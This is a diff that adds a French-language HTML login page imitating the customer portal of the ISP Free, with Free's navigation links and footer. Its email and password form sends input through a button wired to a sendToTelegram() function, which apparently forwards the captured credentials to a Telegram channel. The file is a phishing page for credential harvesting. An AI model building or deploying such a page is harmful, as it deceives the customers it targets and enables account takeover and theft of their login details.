@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connexion Client</title>
+
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+</head>
+
+<body>
+
+<!-- HEADER -->
+<div class="navmenu">
+    <div class="menu">
+
+        <div class="menu_logo">
+            <div class="nav-background"></div>
+            <a href="/"><img src="images.jfif" alt="logo"></a>
+        </div>
+
+        <div class="menu_liens">
+            <div class="liens_animation"><a href="http://www.free.fr/freebox">Freebox</a></div>
+            <span>|</span>
+            <div class="liens_animation"><a href="http://mobile.free.fr/">Mobile</a></div>
+            <span>|</span>
+            <div class="liens_animation"><a href="http://www.free.fr/boutiques">Boutiques</a></div>
+            <span>|</span>
+            <div class="liens_animation"><a href="http://assistance.free.fr/">Assistance</a></div>
+        </div>
+
+        <div class="liens_animation menu_espaceabo">
+            <a href="http://subscribe.free.fr/login/">Espace abonné</a>
+        </div>
+
+    </div>
+</div>
+
+<!-- CONTENU -->
+<div class="container">
+
+    <h1>Bienvenue sur votre espace client</h1>
+
+    <div class="subtitle">Accédez à votre compte</div>
+
+    <div class="input-group">
+        <input type="email" id="email" placeholder="Adresse email">
+    </div>
+
+    <div class="input-group">
+        <input type="password" id="password" placeholder="Mot de passe">
+    </div>
+
+    <button onclick="sendToTelegram()">Se connecter</button>
+
+    <a href="#" class="forgot">Mot de passe oublié</a>
+
+    <div class="info">Besoin d'aide ? Contactez le support</div>
+
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <div class="footer-container">
+
+        <div class="footer-box">
+            <h3><i class="fa-solid fa-store"></i> Trouver une boutique</h3>
+            <p>Dans nos boutiques, les conseillers sont à votre disposition pour vous guider.</p>
+            <a href="#">Trouver une boutique</a>
+        </div>
+
+        <div class="footer-box">
+            <h3><i class="fa-solid fa-scale-balanced"></i> Informations légales</h3>
+            <a href="#">Politique de confidentialité</a>
+            <a href="#">Informations légales</a>
+            <a href="#">Cookies</a>
+            <a href="#">Signaler un contenu illicite</a>
+        </div>
+
+        <div class="footer-box">
+            <h3><i class="fa-solid fa-share-nodes"></i> Suivez-nous</h3>
+            <p>Restez informé des nouveautés et promotions.</p>
+
+            <div class="socials">
+                <a href="#"><i class="fa-brands fa-facebook"></i></a>
+                <a href="#"><i class="fa-brands fa-instagram"></i></a>
+                <a href="#"><i class="fa-brands fa-x-twitter"></i></a>
+                <a href="#"><i class="fa-brands fa-youtube"></i></a>
+            </div>
+        </div>
+
+    </div>
+</footer>
+
+<script src="script.js"></script>
+
+</body>
+</html>
